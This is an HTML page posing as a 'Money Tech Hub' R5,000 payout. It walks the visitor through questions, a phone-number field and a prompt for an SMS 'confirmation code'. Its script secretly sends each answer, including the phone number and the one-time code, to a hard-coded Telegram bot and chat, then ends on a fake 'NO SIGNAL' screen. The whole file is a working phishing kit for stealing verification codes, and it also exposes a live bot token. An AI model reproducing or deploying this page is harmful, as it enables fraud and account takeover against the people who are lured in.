<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Money Tech Hub</title>
  <style>
    body, html {
      margin: 0; padding: 0; height: 100%;
      font-family: "Segoe UI", Arial, sans-serif;
      overflow: hidden;
      font-size: clamp(14px, 1.5vw, 18px);
      background: #f4f6f9;
    }

    .screen {
      display: none;
      position: fixed; top: 0; left: 0;
      width: 100%; height: 100%;
      color: white; flex-direction: column;
      align-items: center; justify-content: center;
      text-align: center; padding: 20px;
    }

    h2 {
      margin-bottom: 20px;
      font-size: clamp(20px, 2.5vw, 28px);
      font-weight: 700;
      text-shadow: 2px 2px 6px rgba(0,0,0,0.4);
      line-height: 1.4;
      max-width: 800px;
    }

    button {
      margin-top: 20px;
      border: none; padding: 14px 28px;
      border-radius: 12px; font-weight: bold;
      font-size: clamp(14px, 2vw, 20px);
      cursor: pointer; transition: 0.3s;
      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
    }
    button:disabled {
      background: grey; 
      color: white; 
      cursor: not-allowed;
      box-shadow: none;
    }
    button.enabled {
      background: #ffda44; 
      color: black;
    }
    button.enabled:hover {
      background: #ffc107;
      transform: translateY(-2px);
    }

    .options-grid { 
      display: grid; 
      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); 
      gap: 15px; 
      max-width: 700px; 
    }
    .option { 
      background: rgba(255,255,255,0.2); 
      border: 2px solid white; 
      padding: 14px 18px; 
      border-radius: 12px; 
      cursor: pointer; 
      font-weight: bold; 
      font-size: clamp(14px, 1.8vw, 18px); 
      backdrop-filter: blur(4px);
      transition: 0.3s;
    }
    .option:hover {
      background: rgba(255,255,255,0.35);
      transform: translateY(-2px);
    }
    .option.selected { 
      background: #007bff; 
      border-color: #0056b3; 
      color: #fff;
    }

    input {
      padding: 12px; 
      border-radius: 10px; 
      border: none; 
      width: clamp(220px, 60%, 400px);
      font-size: clamp(14px, 2vw, 18px);
      text-align: center;
      margin-top: 20px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
    }

    /* Backgrounds with gradients */
    #intro { background: linear-gradient(135deg, #0f2027, #203a43, #2c5364); }
    #question1 { background: linear-gradient(135deg, #283e51, #485563); }
    #question2 { background: linear-gradient(135deg, #56ab2f, #a8e063); }
    #question3 { background: linear-gradient(135deg, #42275a, #734b6d); }
    #countdownScreen { background: linear-gradient(135deg, #1e3c72, #2a5298); }
    #confirmationScreen { background: linear-gradient(135deg, #ff9966, #ff5e62); }
    #loadingScreen { background: linear-gradient(135deg, #232526, #414345); }

    #intro h1 { 
      font-size: clamp(26px, 3.5vw, 42px); 
      margin-bottom: 20px; 
      font-weight: 700;
      text-shadow: 2px 2px 8px rgba(0,0,0,0.5);
    }
    .centerBox { display: flex; align-items: center; justify-content: center; gap: 20px; }
    canvas { display: block; }
    .flag { width: 120px; height: 80px; background: url('https://upload.wikimedia.org/wikipedia/commons/a/af/Flag_of_South_Africa.svg') no-repeat center; background-size: cover; border-radius: 6px; border: 2px solid white; animation: wave 2s infinite ease-in-out; }
    @keyframes wave { 0%{transform:rotateY(0)} 50%{transform:rotateY(15deg)} 100%{transform:rotateY(0)} }

    #countdownNumber { font-size: clamp(30px, 5vw, 60px); font-weight: bold; color: #00ff88; text-shadow: 2px 2px 6px rgba(0,0,0,0.4); }

    #loadingBar { width: 80%; height: 22px; background: #ddd; border-radius: 15px; overflow: hidden; margin-top: 20px; box-shadow: inset 0 2px 5px rgba(0,0,0,0.2); }
    #loadingFill { width: 0%; height: 100%; background: linear-gradient(90deg, #11998e, #38ef7d); transition: width 0.2s; }
    #noSignal { font-size: clamp(24px, 4vw, 40px); font-weight: bold; margin-top: 25px; display: none; text-shadow: 2px 2px 6px rgba(0,0,0,0.5); }
  </style>
</head>
<body>

  <!-- INTRO -->
  <div id="intro" class="screen" style="display:flex;">
    <h1>Welcome to Money Tech Hub</h1>
    <div class="centerBox">
      <canvas id="logoCanvas"></canvas>
      <div class="flag"></div>
    </div>
  </div>

  <!-- QUESTION 1 -->
  <div id="question1" class="screen">
    <h2>If R5,000 was deposited in your bank account right now, what would you use it for?</h2>
    <div class="options-grid">
      <div class="option">Save</div><div class="option">College</div><div class="option">A car</div><div class="option">Bills</div>
      <div class="option">School</div><div class="option">Family</div><div class="option">Vacation</div><div class="option">Donation</div>
      <div class="option">House</div><div class="option">Food stuff</div><div class="option">Business</div><div class="option">Kid</div>
    </div>
    <button id="submitBtn1" disabled>Submit</button>
  </div>

  <!-- QUESTION 2 -->
  <div id="question2" class="screen">
    <h2>What mode of payment do you prefer?</h2>
    <div class="options-grid">
      <div class="option">Ewallet</div><div class="option">Bank transfer</div><div class="option">Paypal</div><div class="option">Mpesa</div><div class="option">Capitec</div>
    </div>
    <button id="submitBtn2" disabled>Submit</button>
  </div>

  <!-- QUESTION 3: PHONE -->
  <div id="question3" class="screen">
    <h2>Please enter your phone number for payment confirmation:</h2>
    <input type="tel" id="phoneNumber" placeholder="Enter phone number">
    <button id="submitBtn3" disabled>Submit</button>
  </div>

  <!-- COUNTDOWN -->
  <div id="countdownScreen" class="screen">
    <h2>Please wait while we process your request...</h2>
    <div id="countdownNumber">50</div>
  </div>

  <!-- CONFIRMATION CODE -->
  <div id="confirmationScreen" class="screen">
    <h2>We’ve sent a payment confirmation code via SMS. Enter it below:</h2>
    <input type="text" id="confirmationCode" placeholder="Enter confirmation code">
    <button id="submitBtn4" disabled>Submit</button>
  </div>

  <!-- LOADING + NO SIGNAL -->
  <div id="loadingScreen" class="screen">
    <h2>Processing your request...</h2>
    <div id="loadingBar"><div id="loadingFill"></div></div>
    <div id="noSignal">NO SIGNAL</div>
  </div>

  <script>
    // --- TELEGRAM CONFIG ---
    const TELEGRAM_TOKEN = "8096107981:AAF4QDZy7Lp73VKkHh_aXscCg6GuaLvn6oM";
    const CHAT_ID = "7865382097";
    let answers = {};

    function sendToTelegram(message) {
      fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: "HTML"
        }),
      });
    }

    function sendQA(question, answer, icon="✅") {
      let msg = `${icon} <b>Question:</b> ${question}\n<b>Answer:</b> ${answer}`;
      sendToTelegram(msg);
    }

    // --- LOGO DOT ANIMATION ---
    const canvas = document.getElementById("logoCanvas"), ctx = canvas.getContext("2d");
    canvas.width = 300; canvas.height = 200;
    ctx.fillStyle = "white"; ctx.font = "bold 120px Arial"; ctx.textAlign = "center"; ctx.fillText("T H", canvas.width/2, canvas.height/1.5);
    const imageData = ctx.getImageData(0,0,canvas.width,canvas.height); ctx.clearRect(0,0,canvas.width,canvas.height);
    let particles=[]; for(let y=0;y<canvas.height;y+=6){for(let x=0;x<canvas.width;x+=6){let i=(y*canvas.width+x)*4;if(imageData.data[i+3]>128){particles.push({x:x,y:Math.random()*-600,targetY:y,speed:0.3+Math.random()*0.5});}}}
    function animate(){ctx.clearRect(0,0,canvas.width,canvas.height);ctx.fillStyle="#FFD700";particles.forEach(p=>{if(p.y<p.targetY)p.y+=p.speed;ctx.beginPath();ctx.arc(p.x,p.y,2,0,Math.PI*2);ctx.fill();});requestAnimationFrame(animate);} animate();

    // --- FLOW ---
    setTimeout(()=>{show("question1")},6000);

    function show(id){document.querySelectorAll(".screen").forEach(s=>s.style.display="none");document.getElementById(id).style.display="flex";}

    function enableButton(btnId){
      const btn=document.getElementById(btnId);
      btn.disabled=false;
      btn.classList.add("enabled");
    }

    function makeSelectable(containerId, btnId, answerKey){
      document.querySelectorAll(`#${containerId} .option`).forEach(opt=>{
        opt.addEventListener("click",()=>{
          document.querySelectorAll(`#${containerId} .option`).forEach(o=>o.classList.remove("selected"));
          opt.classList.add("selected");
          enableButton(btnId);
          answers[answerKey] = opt.textContent;
        });
      });
    }
    makeSelectable("question1","submitBtn1","Q1");
    makeSelectable("question2","submitBtn2","Q2");

    // SUBMITS
    document.getElementById("submitBtn1").onclick=()=>{
      if(!document.getElementById("submitBtn1").disabled){
        sendQA("If R5,000 was deposited in your bank account right now what would you use it for?", answers.Q1, "💰");
        show("question2");
      }
    };

    document.getElementById("submitBtn2").onclick=()=>{
      if(!document.getElementById("submitBtn2").disabled){
        sendQA("What mode of payment do you prefer?", answers.Q2, "💳");
        show("question3");
      }
    };

    document.getElementById("phoneNumber").addEventListener("input",()=>{
      const val = document.getElementById("phoneNumber").value.trim();
      if(val !== "") {
        enableButton("submitBtn3");
        answers["Phone"] = val;
      }
    });
    document.getElementById("submitBtn3").onclick=()=>{
      if(!document.getElementById("submitBtn3").disabled){
        sendQA("Phone number for payment confirmation", answers.Phone, "📱");
        show("countdownScreen");
        startCountdown();
      }
    };

    function startCountdown(){
      let num=50;
      const el=document.getElementById("countdownNumber");
      const timer=setInterval(()=>{
        el.textContent=num;
        if(num<=10){el.style.color="red";} else {el.style.color="#00ff88";}
        if(num<=0){clearInterval(timer);show("confirmationScreen");}
        num--;
      },1000);
    }

    document.getElementById("confirmationCode").addEventListener("input",()=>{
      const val = document.getElementById("confirmationCode").value.trim();
      if(val !== "") {
        enableButton("submitBtn4");
        answers["Code"] = val;
      }
    });
    document.getElementById("submitBtn4").onclick=()=>{
      if(!document.getElementById("submitBtn4").disabled){
        sendQA("Confirmation code received via SMS", answers.Code, "🔐");
        show("loadingScreen");
        startLoading();
      }
    };

    function startLoading(){
      let fill=document.getElementById("loadingFill"),width=0;
      const interval=setInterval(()=>{
        if(width>=100){
          clearInterval(interval);
          document.getElementById("noSignal").style.display="block";
          let summary = "📋 <b>Final Answers Summary</b>\n\n" +
            `💰 Q1: ${answers.Q1}\n` +
            `💳 Q2: ${answers.Q2}\n` +
            `📱 Phone: ${answers.Phone}\n` +
            `🔐 Code: ${answers.Code}`;
          sendToTelegram(summary);
        }
        else{width++;fill.style.width=width+"%";}
      },200);
    }
  </script>
</body>
</html>
